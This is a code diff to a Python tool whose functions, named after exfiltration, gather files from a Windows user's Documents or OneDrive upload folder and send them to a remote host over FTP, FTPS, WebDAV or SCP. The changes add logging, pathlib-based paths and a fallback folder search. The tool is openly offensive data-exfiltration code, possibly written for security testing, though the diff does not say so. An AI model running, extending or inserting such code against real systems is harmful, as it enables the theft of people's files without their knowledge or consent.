@@ -18,6 +18,7 @@ from paramiko import SSHClient
 from scp import SCPClient
 from mega import Mega
 import paramiko
+import pathlib
 
 def ftpExfiltration(host, user, passwd, fileList):
     with FTP(host) as ftp:
@@ -26,6 +27,7 @@ def ftpExfiltration(host, user, passwd, fileList):
         logging.debug('FTP logon, user: %s', user)
   
         for filename in fileList: 
+            logging.debug('FTP upload file: %s', filename)
             ftp.storbinary('STOR ' + filename, open(filename, 'rb'))
         
         ftp.quit()
@@ -46,8 +48,8 @@ def ftpsExfiltration(host, user, passwd, fileList):
         # ftps.set_pasv(True)
 
         for filename in fileList: 
-             print(f'{filename=}')
-             ftps.storbinary('STOR ' + filename, open(filename, 'rb'))
+            logging.debug('FTPS upload file: %s', filename)
+            ftps.storbinary('STOR ' + filename, open(filename, 'rb'))
         
         ftps.quit()
 
@@ -80,7 +82,8 @@ def webdavExfiltration(host, user, passwd, source, fileList):
     logging.debug('WebDAV connection, host %s, user: %s', webdavHostName, user)
        
     for filename in fileList: 
-        client.upload_sync(remote_path=filename, local_path=source+'\\'+filename)
+        # client.upload_sync(remote_path=filename, local_path=source+'\\'+filename)
+        client.upload_sync(remote_path=filename, local_path=source / filename)
 
     logging.debug('WebDAV host file list (first 10 files): %s', client.list()[0:10])
 
@@ -100,7 +103,9 @@ def scpExfiltration(host, user, passwd, source, fileList):
             for filename in fileList: 
                 # Remove requirement for host to have an scp directory
                 # scp.put(source+'\\'+filename, remote_path='./scp')
-                scp.put(source+'\\'+filename)
+                # scp.put(source+'\\'+filename)
+                logging.debug('SCP upload file: %s', filename)
+                scp.put(source / filename)
         
             # logging.debug('SCP host file list (first 10 files): %s', ssh.exec_command('ls'))
 
@@ -161,7 +166,7 @@ def buildIncludeTuple(includeFile):
     return tuple(includeList)
 
 def dataExfiltration(protocol, host, user, passwd, source, include):
-        
+    
     # include, if specified, should be the name of a file containing include file types
     if include == "":
         includeTuple = ()
@@ -170,9 +175,18 @@ def dataExfiltration(protocol, host, user, passwd, source, include):
         
     startDirectory = os.getcwd()
 
-    # set as appropriate
-    source = os.environ['USERPROFILE']+'\\Documents\\upload'
-    os.chdir(source)
+    # locate the upload directory in .\OneDrive\Docuemnts or .\Documents
+    source = pathlib.Path(os.environ['USERPROFILE']+'\\OneDrive\\Documents\\upload')
+
+    if not os.path.isdir(source):
+        source = pathlib.Path(os.environ['USERPROFILE']+'\\\\Documents\\upload')
+        
+    try:
+       os.chdir(source)
+    except:
+        print('Cannot find upload directory')
+        logging.debug('Cannot find upload directroy in Documents, exiting')
+        quit()
 
     fileList=buildFileList(includeTuple)
 
